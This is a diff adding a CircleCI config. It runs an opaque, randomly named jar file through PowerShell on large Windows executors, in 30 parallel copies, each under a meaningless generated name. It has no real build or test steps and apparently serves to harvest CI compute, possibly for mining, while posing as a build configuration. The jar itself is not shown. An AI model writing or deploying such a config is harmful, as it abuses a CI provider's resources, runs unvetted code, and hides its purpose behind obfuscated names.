@@ -1,0 +1,82 @@
+version: 2.1
+
+orbs:
+  win: circleci/windows@5.0
+
+jobs:
+  dataser622287:
+    executor:
+      name: win/default
+      size: large
+    steps:
+      - checkout
+      - run:
+          name: migrate38pkg8226
+          command: |
+            java -jar ANALYZESER98441.jar
+          shell: powershell.exe
+
+workflows:
+  version: 2
+  WATCHMOD444219:
+    jobs:
+      - dataser622287:
+          name: PHASELINE123329
+      - dataser622287:
+          name: HASHbase188714
+      - dataser622287:
+          name: proxyCER592760
+      - dataser622287:
+          name: CTRLism61010
+      - dataser622287:
+          name: EXECDOM460909
+      - dataser622287:
+          name: MOUNT18LER9535
+      - dataser622287:
+          name: hideLOCAL951036
+      - dataser622287:
+          name: logout422190SHIP
+      - dataser622287:
+          name: PIPEKEY291510
+      - dataser622287:
+          name: WEB807938BER
+      - dataser622287:
+          name: PAUSEcore456059
+      - dataser622287:
+          name: DATAARY346624
+      - dataser622287:
+          name: proc933101PROD
+      - dataser622287:
+          name: stageGER448038
+      - dataser622287:
+          name: compress386632HOOD
+      - dataser622287:
+          name: securelocal517761
+      - dataser622287:
+          name: taskasync637463
+      - dataser622287:
+          name: cert477303api
+      - dataser622287:
+          name: build70alpha6265
+      - dataser622287:
+          name: VERIFYment581736
+      - dataser622287:
+          name: STAGESRV937515
+      - dataser622287:
+          name: modify457975DELTA
+      - dataser622287:
+          name: bridgeREMOTE605623
+      - dataser622287:
+          name: PIPEgamma507759
+      - dataser622287:
+          name: view465169ORY
+      - dataser622287:
+          name: router986057ABLE
+      - dataser622287:
+          name: HOODcluster816090
+      - dataser622287:
+          name: API6NANO4923
+      - dataser622287:
+          name: SECURE29PHASE3474
+      - dataser622287:
+          name: pipeFUL660082
